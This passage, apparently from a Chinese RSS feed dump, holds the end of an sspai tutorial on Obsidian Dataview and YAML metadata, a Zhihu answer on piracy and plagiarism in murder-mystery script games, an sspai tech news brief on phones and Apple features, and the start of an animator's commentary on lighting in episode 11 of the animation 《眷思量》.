<code>#时间管理 </code>。现在你想要把时间管理标签下的笔记形成一个目录。</p>\n<p>你该怎么写 Dataview 语句呢？</p>\n<p>还记得上面的 4 个关键设置字段吗？<code>from</code> 是检索范围，既可以从文件夹，又可以从标签。</p>\n<pre class=\"language-Dataview\"><code>```Dataview\nlist\nfrom #时间管理 \n```</code></pre>\n<p>不需要排序的话，代码就是这么简单。</p>\n<p>你学会了吗？如果学会了，下面我们可以加点好玩的东西。</p>\n<h3>从作者</h3>\n<p>场景：假设，你最近读了同一个作者的几部作品（论文、书籍、视频、电影都是一样的），形成了几篇笔记。笔记多了以后，你就想弄一个该作者的专题。这时候，有什么办法能做到呢？</p>\n<p>哎，Dataview 的支持元数据里可没有作者这个属性啊，怎么办呢？</p>\n<p>我们自己加属性！这时候，yml 就派上用场了。</p>\n<h3>用 YML 给笔记加点元素</h3>\n<p>简单的说 yml 是一种标记语言。顺便说一下 markdown 也是一种标记语言。朴素的理解就是以某种规则写的一种文本。</p>\n<p>各位，用工具的时候，我们可以不求甚解，拿过来学会怎么用就可以了，甚至，你只用知道怎么在自己的需求中用就可以了。</p>\n<p>所以不需要特别去了解 yml。我们来看看 yml 怎么为我们所用吧。</p>\n<p>yml 语法大概长这样：</p>\n<pre class=\"language-\"><code>---\ntitle: \nauthor: \ntags: []\n---</code></pre>\n<p>yml 的规则：</p>\n<ol>\n<li>\n<br>只要写在 6 个横杠符号之间，yml 就可以被识别。够简单吧？</li>\n<li>必须写在文件最上方</li>\n</ol>\n<p>里面的 <code>title</code>、<code>author</code> 我们叫它 key，也就是你给这个字段起的名字，所有的 key 都是自己定义，没有必要的规则，就像你给表格起列名一样。yml 的 key 也支持中文名哦。例如这样：</p>\n<pre class=\"language-\"><code>---\n作者: 鲁迅\n---</code></pre>\n<p>我就给笔记加了「作者」这个属性。然后我们就可以使用「作者」作为条件建立目录了。</p>\n<h3>Dataview 使用 yml 的元素</h3>\n<p>where 和 sort 就可以直接使用你在 yml 中设置的 key 了。看看下面的写法：</p>\n<pre class=\"language-Dataview\"><code>```Dataview\nlist \nfrom \"\"\nwhere contains(作者 ,\" 鲁迅 \")\n```</code></pre>\n<p>看下效果：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/675d393d3b83df3765bbc942088c2a85.png\"></figure><p>上面依次是：包含作者为「鲁迅」的原笔记、聚合作者为「鲁迅」的目录编辑模式、聚合作者为「鲁迅」的目录预览模式。</p>\n<p>嗯哼，鲁迅合集就做好了。</p>\n<h2>扩展：创建一个书目列表吧！</h2>\n<p>上面你已经学会了限制检索范围、模糊搜索文件名来创建列表，学会了从标签创建列表，还学会了用 yml 定义的 key 当作字段做条件，基本的检索语法你已经学会啦。</p>\n<p>现在我们想在展示形式上有所改变，比如书目列表。我不想只展示作品的名字，我还想展示作者、阅读日期、标签。</p>\n<p>还记得上面列表中的展示形式吗？</p>\n<p>对，就是 Dataview 语法的第一行那个 <code>list</code>，现在我们来变一下，写个 <code>table</code> 吧。</p>\n<p>不过我们的语法有一点小小的改动。既然是 table，那么列名就必不可少。</p>\n<p>先贴一下代码看看吧:</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://i.loli.net/2021/08/08/Xm4DFryzwWnsA61.png\" alt=\"\"></figure><p>上面唯一的变化就是 table 这一行：<br><code>table author,from,tags</code> 。table 后面这三个字段就是我为表格设计的列。而 author 是我为笔记中的作者元素，from 是书籍来源，tags 是标签。这三个元素都写在来 yml，如今被 Dataview 识别，就可以展现我想要的列表。</p>\n<p>where 条件里，我写的匹配字段是 <code>type</code>，这也是我 yml 里面的元素，表示输入内容，自定义了三个值：book、page、video。</p>\n<p>sort 这句，用 author 字段排序，后面跟了一个 <code>desc</code>，表示倒序。</p>\n<h2>结语</h2>\n<p>以上，Dataview 常用的内容就讲完啦。task 就暂时不讲了，使用的不多。</p>\n<p>如果你有什么不明白的，欢迎留言告诉我。谢谢你看到这里，下期再见！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68183"},{"title":"媒体刊文指出剧本杀风靡，抄袭盗版问题泛滥，相关问题是否很严重？应如何解决？","date":"2021-08-18 03:00:09","description":"\n<p>开门见山，这是由于剧本杀在疫情以来风靡，导致众多对剧本杀不甚了解的投资者进入剧本杀行业所带来的必然结果，当然也是每个文化产业（姑且称剧本杀为文化产业吧）的必经阶段</p>\n<p>法制日报的这个文章所指的盗版问题有二，一个一个来谈吧。</p>\n<h2>一.店家为了节约成本选择直接购买盗版剧本。</h2>\n<p>首先文章中所提出的「很多店家为了节约成本，会选择直接购买盗版剧本。」这个问题看似十分严重，会严重影响整个剧本杀行业的生态，导致劣币驱逐良币。<b>但我个人倒不是很担心。</b>原因有三：</p>\n<h3><b>正版剧本杀店家的抵制</b></h3>\n<p>目前从我的角度看，正是由于盗版横行带来严重结果大家很清楚（损害了所有正版店家等利益）因此所有的剧本杀店家都在不约而同的抵制盗版剧本杀。每当一个店家被曝光出使用盗版剧本，他在该城市的剧本杀圈子中基本宣告「社死」。</p>\n<p>为什么呢？</p>\n<p>因为当这种事发生时，每个正版店家从老板到 DM 乃至客服，往往都会发朋友圈等一些社交平台上来对这家使用盗版剧本的店家进行谴责，而这群人的朋友圈里剧本杀玩家的浓度相当之高，一旦消息开始传播，不到一天，这个城市绝大多数的剧本杀爱好者就都会知道「有一家店用盗版剧本。」大家也会去自觉的抵制。这时候有人可能会问，剧本杀店家抵制可以理解，毕竟这触及到了利益，玩家为什么会大量的去抵制呢？这就要引出第二个原因⬇️</p>\n<h3><b>玩家的抵制。</b></h3>\n<p>无论是盗版剧本还是使用盗版剧本的店家，带给玩家的游戏体验一定是极差的。</p>\n<p>首先，盗版剧本使用的纸张与修订技术往往是较差的。每一个剧本从构思，到展会测车，再到最后的完善和制作与发行，中间是过程是繁琐且辛苦的。做一个不恰当的比喻，可以说每一部剧本都是作者和发行的孩子，更何况他们都指望这个孩子挣钱。因此发行往往都会将剧本（包括但不限于剧本本身的装订、剧本使用纸张、线索卡的制作工艺、道具）包装的非常好。同时好的包装也是剧本的重要加分项。现实中也发生过一些剧本因华丽的包装来吸引众多店家购买，或吸引玩家体验。那么，作为顾客，花了小一百块钱（城限和独家可能更多）来体验一个剧本杀，等剧本发下来发现剧本知识拿很普通的 A4 纸随意订了一下，部分内容还有重影或洇墨，甚至会有缺页漏页，你会不会感觉吃了一只苍蝇。</p>\n<p>其次，使用盗版剧本店家的底层逻辑是什么？是省钱，<b>是通过「节流」的方式获取更大的利益。</b>而剧本杀的体验并不是只有剧本内容的质量和剧本装订的质量。更重要的是 DM 的带本水平以及 NPC 的水平。而在当前的剧本杀行业，由于 DM 这个职业局限性的影响，优秀的 DM 是非常少见的。当然薪资也不算低（相比于水平一般的 DM ），那么这些「节流」的店家可能去浪费时间精力和金钱去找游戏的 DM 吗，一定是不会的。这些店家大概率会去找大量兼职 DM，而这类 DM 演绎能力差、不会扶车（在剧本推进不下去或玩家推理大方向错误严重的情况下，在不剧透的大前提下对玩家的方向进行纠正）、无法脱稿。玩家的游戏体验自然就差。当然这类店家往往还会让一个 DM 带多个剧本杀。这个游戏体验之差不用过多赘述，相信大家大概能感受到一人带多车时玩家的痛苦。</p>\n<p>最后，这个是我个人比较武断的观点。也是与上面的「节流」有关，即想省钱的店家在装修和氛围的营造上一定不会舍得花钱。那么这种店往往会在逼仄的居民楼或随便找个写字楼（写字楼如果装潢 OK 也是没问题的）开，在这种地方玩本我相信游戏体验一定不会很好。</p>\n<h3><b>其发行以及作者的抵制</b></h3>\n<p>这一点其实是可以包含在第一点里的，但之所以单独列出来，是因为如果前面两个是行业下游，那么发行以及作者就算是上游。剧本杀盗版横行对行业上游造成的危害是难以估量的。发行能做的不多也就是上文所说的，把剧本做的再精致一些，花功夫做一些防伪或是让同城店铺举报。这一点就不多说了。</p>\n<p>综上，在剧本盗版这方面，可以发现盗版的店家是很难有生存空间的。这也正是我个人认为这一点不需要多说的原因。</p>\n<h2>二.抄袭核心诡计</h2>\n<p>关于法治日报刊文的第二点「抄袭核心诡计」。这个就有讨论的必要了，而且这个也是对剧本杀作者更重要的一点。依然还是先亮观点：<b>剧本杀抄袭不可能根除。</b>原因同样有三：</p>\n<h3>抄袭难定义</h3>\n<p>在推理圈子里，抄袭一直是一个普遍存在，而且很难定义的点。举一个很简单例子，《金田一少年事件簿》和《名侦探柯南》应该算是很多人的童年回忆了。而这两部作品中事实上就有许多涉嫌抄袭的剧集。</p>\n<ul>\n<li>《歌剧院杀人事件》抄了《黄屋奇案》里面走廊消失和《古墓之谜》利用窗户作案；</li>\n<li>《悲恋湖杀人事件》为复仇杀害死名字缩写为 S·K 的人的情节抄笹泽左保的《大海的请帖》；</li>\n<li>《蜡像城杀人事件》中凶手扮蜡像的情节类似岛田庄司《诅咒的木乃伊》中凶手藏身铠甲；</li>\n<li>..........</li>\n</ul>\n<p>《金田一少年事件簿》我不是太了解，这个是我在豆瓣上找的，感兴趣的大家可以再豆瓣搜「lshstar」，大佬基本把《金田一少年事件簿》中抄袭的都列出来了。大家可以去看看（侵删）</p>\n<p>同样的，《名侦探柯南》里同样也有大量抄袭的案件，同样举几个例子：</p>\n<ul>\n<li>《鸟取县蜘蛛公馆的怪事》抄袭了吉尔伯特·基思·切斯特顿的《新月市的奇迹》，说起来作者名字大家可能不了解，但布朗神父应该还是比较出名的。</li>\n<li>《电视台杀人事件》抄袭了阿加莎的《古墓之谜》（这是经典手法了，如果有更早的请在评论区指出）。这个手法更出名，剧本杀《七个密室》里的第二还是第三个就用了这个手法，但是很难说《七个密室》涉嫌抄袭。</li>\n<li>.........</li>\n</ul>\n<p>《柯南》里涉嫌抄袭的剧集我一样不多说了，有兴趣的大家可以在知乎站内或者豆瓣搜一搜，应该会有大佬列出来的。</p>\n<p>综上我们不难感受到，剧本杀的抄袭与推理小说、游戏或电影一样，抄袭都是很难去定义的。</p>\n<h3>定义难追责</h3>\n<p>我们退一步说，如果我觉得这个人抄袭了，而且周围的人也都认可，那下一步肯定就是要追责了。但是以剧本杀行业现状来看，<b>对抄袭进行追责这件事的收益与风险（或者说是成本）是远不成正比的。</b></p>\n<p>同样举个简单的例子，假设有一个剧本杀 A，我确定这个剧本杀 A，抄袭了我的剧本杀（或者推理小说同理）S。我现在要去告这个作者。我先要交诉讼费（我不太懂法律，告到法院应该是要交诉讼费的吧），然后要找律师，再然后还要投入我自己的时间和精力，甚至会耽误我自己的正事。假设我告赢了，我能获得什么。寥寥无几的赔偿？周围人的认可？这和我的付出大概率是不成正比的，说白了还是争口气。但假设我输了，不仅之前的所有投入都打了水漂，我自己还惹了一身骚，我容易吗我？</p>\n<p>所以说再对抄袭进行定义之后，追责又是一个很大的问题，而且这个问题同样难以解决。</p>\n<h3>剧本杀本身的局限性以及版权困境</h3>\n<p>这个有些涉及到我的知识盲区，如果说的与事实不符还请大家在评论区指正，感谢大家！</p>\n<p>目前我接触到的所有剧本杀作者与发行，没有一家去申请书号，无论是国内单书号、国内从书号还是 ISBN编号，都没有。究其原因我认为有以下几点</p>\n<p>首先申请书号是需要时间和金钱的，而剧本杀其实是一个节奏很快的行业，能多写出来一部优秀的剧本，就多挣一本的钱，写不出来或者发行不出来，就挣不到钱，那既然申请与不申请都不耽误剧本杀的发行，为什么还要申请呢。</p>\n<p>其次申请书号也不一定百分百成功，随着剧本杀的发展，有众多不适合未成年人玩的剧本杀，而剧本杀又没有分级制度（不过大部分的店家看到玩家是小孩子一般只会开不黄暴的欢乐本），怎么怎么可能就不可能很容易的就让剧本杀拿到书号。</p>\n<h2>该如何解决？</h2>\n<h3>盗版剧本好解决</h3>\n<p>综上所述，剧本杀盗版的第一个问题，其实相比之下比较好解决。当然现在也会有更加精致的盗版剧本，但这种剧本往往是城限或独家，买了这个本的店家往往对所在城市哪些店家有这个本很清楚，那么有一天或许发现有一家没有授权的店的剧本单上出现了这个剧本，反手一个举报就好了。剧本杀圈子不大，同一城市的剧本杀 DM 或者老板也会经常串门去玩每个店家的招牌本，对于这种破坏平衡的行业渣滓，店家和大部分玩家还是能进行判断并做出正确应对的。<b>本质上来说就是这种盗版侵犯了店家和顾客的利益，而店家和顾客作为剧本杀产业链比较小的单位，是很容易自上而下进行自我清洁</b>（随便想的词，可能不是很恰当）</p>\n<h3>抄袭核心难根除</h3>\n<p>但是针对第二个问题，这个问题在我看来才是真正无解的。首先，很难发动店家或者顾客去帮助发行与作者。因为抄袭核心诡计这个事情，它触及不到店家和玩家的核心利益。店家为了赚钱，玩家为了开心，那一个抄袭的剧本耽误店家赚钱了吗？没有。耽误玩家获得好的游戏体验了吗？或许有，但是占极小数。那么在这种情况下，只靠发行和作者，就不可能解决这个问题。</p>\n<p>剧本杀究其根本还是一个小众圈子，于正抄袭、郭敬明抄袭，我们可以发动广大的网民去进行道德审判，因为蛋糕够大。但是剧本杀这个新兴的娱乐项目，以目前的发展水平根本达不到所谓的舆论压力。撑死了一些推理迷可能在自己朋友圈骂骂这个作者，然后就没有然后了。想追责？想想上文讨论的<b>成本与收益。</b></p>\n<p>以上，感谢大家的阅读，如果想起来其他的还会继续补充。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zha-yu-gua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">爱吃猹的瓜</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/480078479/answer/2065815893?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">35 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/441309366?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">去哪里可以买到大量剧本杀剧本的版权？</a><br><a href=\"http://www.zhihu.com/question/471158742?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">大家是喜欢玩线上剧本杀，还是更愿意玩线下实体店剧本杀？</a><br>\n","link":"http://www.zhihu.com/question/480078479/answer/2065815893?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：Google 正式推出中端智能手机 Pixel 5A、iQOO 推出全新 8 系列手机","date":"2021-08-18 01:02:19","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>微信回应「刷掌支付」传闻：正在内部技术调研中</h3>\n<p>8 月 17 日针对传闻中微信将推出「刷掌支付」，腾讯方面向媒体表示该技术目前仍然处于内部技术调研阶段，尚未展开测试，目前也没有应用计划。早前新言财经等媒体称，刷掌支付为腾讯优图和微信支付合作推出的新支付方式，用户需要在刷脸设备中注册手掌并将其关联到个人微信账号中，在线下消费时扫描手掌完成支付。<a href=\"https://finance.sina.com.cn/tech/2021-08-17/doc-ikqcfncc3332013.shtml?cref=cj\" target=\"_blank\">来源</a></p>\n<h3>Google 正式推出中端智能手机 Pixel 5A</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/18/article/654d70ffee9cebffee103d86fdd48ff0\"></figure><p>Google 于 8 月 17 日正式发布了其中端智能手机 Pixel 5A，新机拥有 IP67 防水防尘等级，为 A 系列设备首创，屏幕上相比原先的 4A 的 5.8英寸屏幕提升到 6.34 英寸，电池容量高达 4680mAh，处理器采用了和 Pixel 5 相同的高通骁龙 765G，但内存仅为 6GB，影像方面只采用后置双镜头模组，包含一颗 1600万像素的广角镜头。网络上方面支持 5G 但不支持毫米波，目前该机已经在美国以及日本接受预购，8 月 26 日上市，售价为 449 美元。<a href=\"https://store.google.com/us/product/pixel_5a_5g?hl=en-US\" target=\"_blank\">来源</a></p>\n<h3>三星宣布推出 Galaxy A52s 5G</h3>\n<p>继今年早些时候推出的 Galaxy A52 5G 之后，三星宣布推出其升级款 Galaxy A52s 5G，后者配备了高通升级的骁龙 778G 处理器，以及全新的薄荷绿配色，除此之外两者配置几近相同：6.5 英寸的 Super AMOLED 屏幕，支持 1080 x 2400（FHD+）分辨率及 120Hz 刷新率，后置 6400 万像素、1200 万像素、500万像素、500万像素的四颗摄像头以及 3200 万像素的前置摄像头，8G 运行内存和 256G 存储（可通过 microSD 存储卡扩展至最高 1TB），拥有 4500 mAh 电池并支持最高 25W 快充。<a href=\"https://news.samsung.com/uk/the-samsung-galaxy-a52s-5g-provides-enriched-entertainment-at-excellent-value\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/18/3f36e34d4987ee78479403fadf80dd10.jpeg\"></figure><h3>iQOO 推出全新 8 系列手机</h3>\n<p>iQOO 推出新款手机 iQOO 8 和 iQOO 8 Pro。</p>\n<p>iQOO 8 搭载高通骁龙 888 处理器及 120Hz 10 亿色全面屏，支持最高 1200nit 的亮度以及 6000000 : 1 对比度，拥有 4350 mAh 容量电池，配合 120W 闪充技术 18分钟即可充满。后置 4800 万像素微云台主摄（IMX598传感器）、1300万像素超广角摄像头（120°广角，开启畸变矫正后广角度数为 108°）和 1300 万像素人像摄像头（50mm 等效焦段）三颗摄像头，前置摄像头为 1600 万像素。其 8+128G 版售价 ¥3799，12+256G 版售价 ¥4199。</p>\n<p>iQOO 8 Pro 搭载高通骁龙 888+ 处理器及 120Hz 2K 分辨率全面屏，亮度和对比度分别提升至 1500nit 和 8000000 : 1，拥有 4500 mAh 容量电池，并支持 50W 无线闪充和 10W 反向无线充电，可以为其它设备充电。后置 5000 万像素微云台主摄（IMX766V 传感器，1/1.56” 超大底）、4800 万像素超广角主摄（114°广角，IMX598传感器）和 1600 万像素人像摄像头（60mm等效焦段），前置 1600 万像素摄像头。其 8+256G 售价 ¥4999；12+256G 售价¥5499；12+512G 售价 ¥5999。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/18/5588d89011622db1a8b4ec6a16948c8a.png\"></figure><h3>Apple 即将开启下一轮 Apple Watch 活动挑战赛</h3>\n<p><br>Apple 已将下一次 Apple Watch 活动挑战赛定于 8 月 28 日，以「欣赏世界各地国家公园的美景」为主题。Apple Watch 用户可以通过完成远足、步行、轮椅锻炼或至少跑一英里来获得成就。<a href=\"https://9to5mac.com/2021/08/17/next-apple-watch-activity-challenge-scheduled-for-august-28-to-celebrate-national-parks/\" target=\"_blank\">来源</a></p>\n<h3>Apple 表示 SharePlay 不会成为 iOS 15 初始版本中的功能</h3>\n<p>Apple 于 8 月 17 日对外界证实，iOS 15 中的一项重要新功能 SharePlay 已经被证实推迟，在秋季发布的首个 iOS 15 正式版本中将不会带有该功能，而在之后的开发者测试版中将会回归，并在晚些时候的软件更新中向公众推出，SharePlay 允许用户同时享受娱乐内容，并支持跨设备同步。<a href=\"https://www.theverge.com/2021/8/17/22629165/apple-shareplay-ios-ipad-os-15-macos-delayed\" target=\"_blank\">来源</a></p>\n<h2><strong>少数派的近期动态</strong></h2>\n<ul>\n<li>📈 特惠订阅 + 深度教程，<a href=\"https://sspai.com/item/25\" target=\"_blank\">Microsoft 365 工具升值包</a> 带你进阶学习 Office 使用技巧。</li>\n<li>🌟 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol06-pre-toys-for-adults\" target=\"_blank\">大人的玩具</a>》已经上线，来看看乐高与模型的故事，祝你玩得开心。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》上线电商平台，<strong>少数派预购会员将获赠该书</strong>。<a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单 &gt;</a>\n</li>\n<li>⭐ 又到开学季，面对学生朋友送点什么好？去 <a href=\"https://sspai.com/bullet/1628500218\" target=\"_blank\">一派</a> 聊聊。</li>\n</ul>\n<h2><strong>你可能错过的文章</strong></h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68300\" target=\"_blank\">找回被「杀后台」干掉的用户体验：聊聊我眼中的「原子内存」</a></li>\n<li><a href=\"https://sspai.com/post/68224\" target=\"_blank\">开学季｜证多不压身，聊聊大学里值得「拼一拼」的证书考试</a></li>\n<li><a href=\"https://sspai.com/prime/story/vol06-islide-chapter-4\" target=\"_blank\">展示逻辑的更优解——用形状表达抽象信息</a></li>\n<li><a href=\"https://sspai.com/post/68001\" target=\"_blank\">国物馆 | 十年以后我为什么开始信赖国货护肤品？</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68353"},{"title":"如何评价国产动画《眷思量》第十一集？","date":"2021-08-17 15:30:08","description":"\n<p>知乎的大家好，这周有在尽量调整多休息补觉，知乎也尽量发得比上周早了些，且不用赶着交很多反馈，有空多聊两句。</p>\n<p>播到第11集了，很多线索也展现出来，开篇玄哥抓住窥探灵识的点，但这个岛水很深，相信大家看到现在也能感觉到，所以奉眠没有把握是安全的，镜玄也认同了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-625ac341cf7b48aa37215eaef02bb6af_720w.jpg?rss\" data-rawwidth=\"2088\" data-rawheight=\"1210\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-625ac341cf7b48aa37215eaef02bb6af\" data-watermark-src=\"v2-5b4adc36fa0d93d8db2b6d5d1c71af62\" data-private-watermark-src=\"v2-e36353506fd26d57dae9b438d8195dd9\"></p>\n<p>且这次奉眠在火芝问题上肯帮镜玄，也让两人关系从之前剑拔弩张的矛盾中有所缓和。毕竟奉眠没有带娃经验，对于怎么跟叛逆少年沟通她不经历一些事也不知道。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-64e292dbc1efa43dc075e9ee58eb7c66_720w.jpg?rss\" data-rawwidth=\"1908\" data-rawheight=\"1054\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-64e292dbc1efa43dc075e9ee58eb7c66\" data-watermark-src=\"v2-37b021eb09af5395cdc3e793ba43d888\" data-private-watermark-src=\"v2-cc46b3070808d771df5b0cfc848d638c\" data-tags=\"politic\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-16ff95cc792b02fda65322b6219dc92c_720w.jpg?rss\" data-rawwidth=\"1800\" data-rawheight=\"1036\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-16ff95cc792b02fda65322b6219dc92c\" data-watermark-src=\"v2-65f02705f436c267832f5172e454065f\" data-private-watermark-src=\"v2-99f8561635df3cf870580ca48e4d5cd9\"></p>\n<p>而镜玄其实隐忍惯了，性子本就比较沉稳，不是太难忍的事，他会持续惯常冷静模式的。但对屠丽会例外。</p>\n<p>这次他从前面集的预感，到这集真的从丽崽口中听到准备离岛，情绪第一次失控，虽然只有一瞬间，马上就意识到并先支走丽崽。对我来说也足以体现玄哥心里对这段羁绊的在乎。岁月里的陪伴对玄哥来说丽崽早就是他想守护好的存在。突然知道真的会离开相信换谁都会意难平吧。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4015e44e420a28d3bda9e65bec2c8491_720w.jpg?rss\" data-rawwidth=\"1902\" data-rawheight=\"1062\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4015e44e420a28d3bda9e65bec2c8491\" data-watermark-src=\"v2-a45dcaf4311db4fa6522242d9798692e\" data-private-watermark-src=\"v2-bfa86b1c80f9775798e426206e2e861b\"></p>\n<p>他捶桌子突然克制住的那一下，有一层是在努力调整收敛情绪，毕竟以玄哥的实力，真的用力锤下去，恒水居这层都保不住*罒▽罒*  ，动静太大就算周围有结界保护也不好收场。</p>\n<p>而丽崽这集也把我很想表达的性格通透的点找到合适的事件表达出来了。她懂是她豁达的立足点，但她不会妥协，仍然有明确的目标去实施，但“恒老”的生气也会让她反思，虽然方向有些乌龙～～丽崽你凭自己身为凡人的寿命是送不走玄哥的(ฅ&gt;ω&lt;*ฅ)</p>\n<p>到这一集，屠丽这个角色的塑造，进行完了大部分铺垫，她于我是特别的，可能成长过程中一直碰壁导致的不服气吧，普通女孩为何不能当主角？用实力证明自己成为更优秀有地位的人，对我来说比天生含着金汤匙要更动人，毕竟生来富贵是少数，大多数都要在岁月中拼搏，只有具备丽崽拼搏豁达的精神，才是立足于世间必备的生存技能。所以这次任性地要表达这样一个特立独行的女主，是清澈透亮又是豁达坚毅的！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-38887e80b7277603548ff73e6a564a1f_720w.jpg?rss\" data-rawwidth=\"2128\" data-rawheight=\"1206\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-38887e80b7277603548ff73e6a564a1f\" data-watermark-src=\"v2-57c503d62f27fbe0441e9db93b72606c\" data-private-watermark-src=\"v2-e6304d18d94e210b50c228d704b0b740\"></p>\n<p>这集对两位主角都是性格细化丰满的一集，对配角展现较多的是小侯爷萧霁；强调了他的共情力，他理解丽娘在岛上没有归属感，所以也希望她回凡间找到“家”的概念；相信也会成为他的人格魅力之一。但镜玄目前并不相信萧霁是为屠丽好，两人后续矛盾点还是会有的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a4ea8f6a4ae999fe3e7744e8d78b2ca3_720w.jpg?rss\" data-rawwidth=\"1894\" data-rawheight=\"1058\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a4ea8f6a4ae999fe3e7744e8d78b2ca3\" data-watermark-src=\"v2-1d9554efac3c1cb51dae1ce7981321b6\" data-private-watermark-src=\"v2-742b13827c3ea155ccd28770f6ab834f\"></p>\n<p>上回第一次讲了点光影设计，知乎催更团很开心(｡◝ᴗ◜｡)，并说希望能多方面科普些制作方面的点 ，可以提供给同行交流。很多方面整理素材都比较麻烦，最近花在眼睛上的时间比较多，手头最现成的还是灯光的素材啦。</p>\n<p>11这集光影比较难的点是萧霁关押处室内外的光线表现。</p>\n<p> 室内有火光，室外有天光，两人在交界处对话，两边的光线，这点确实难到了我和灯光组的小伙伴。原本从第一集推到第十一集，大家已经磨合的非常默契了，很多难点情况已在前面的集遇到并解决了。忽然有个新点要推敲，于是也把此处的处理经验分享下。</p>\n<p>如下图，(先忽略萧霁渲染版本问题)</p>\n<p>第一版是中期常规打光效果，但丽崽面部太暗和背景分不开，于是提出修改，中期改了第二版，但我推测萧霁屋内火光强度和衰减，丽在窗外不会受到这么强的烛光照射，所以会显得突兀。于是动手p图给到灯光组，同时平衡了天光对丽面部颜色的影响。但也要凸显丽面部存在，不能被背景吃掉。最终灯光组终于改好。画面和谐多了~主次也不会乱。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d8c3e278e95e3d33f069dfafad47905a_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"2158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-d8c3e278e95e3d33f069dfafad47905a\" data-watermark-src=\"v2-491302c4d3d83c96895214b233242d44\" data-private-watermark-src=\"v2-0b0ba6acd25a755ea7f7e3a38d99c365\"></p>\n<p>还有些情况如下图，第一张正常光线角色面部会暗很多，但是这样我好不容易给丽崽调的表情表演就看不出来了 ，于是特殊镜头特殊处理，把面光做了补光柔化提亮。在不改变画面和谐的前提下完善。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-af897c90ecc72325c8a253499d9de749_720w.jpg?rss\" data-rawwidth=\"957\" data-rawheight=\"1111\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-af897c90ecc72325c8a253499d9de749\" data-watermark-src=\"v2-33705d09b3460c7b6eb5349ed0934303\" data-private-watermark-src=\"v2-3d21e86d637bb79e7e53a7fd9b201e4c\"></p>\n<p>类似的案例还有丽靠在窗边的情况，因屋内设置了火光，丽脸上会出现木头的投影，但这个信息比较多余，且在现实光照环境中，漫反射复杂，室内光比较强烈才会有这样的投影。而电脑靠计算不会主动筛选，很多信息都会算出来。需要人为去控制，于是就让灯光组的小伙伴关掉了这层的投影链接。让丽面光更加干净利于表演。不然丽崽回头脸上就是几道杠=v=。。。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-866b066623619f8589d9a08e30ee74c1_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"2209\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-866b066623619f8589d9a08e30ee74c1\" data-watermark-src=\"v2-6d8ab2a8c37e977d86dc8d0838ffcaaf\" data-private-watermark-src=\"v2-104401936eb3a6a8b9aa0f9db00ac30b\"></p>\n<p>中间眠眠给地图的这场，整场光线和灯光组碰好后，发现这镜眼角到鼻翼结构比较清晰，让角色情绪看起来较大，于是调整灯光强度和微调颜色，让前面光线柔和很多，弱化鼻子的结构，这样面部也更柔美。这类操作也是对于眠的面光经常需要用到的技巧。可能会有朋友问那为何不把鼻子上的结构去掉~，因为模型再化简会失真，目前每个角色模型上每个细节都是非常花精力推敲到合适的  。</p>\n<p><img 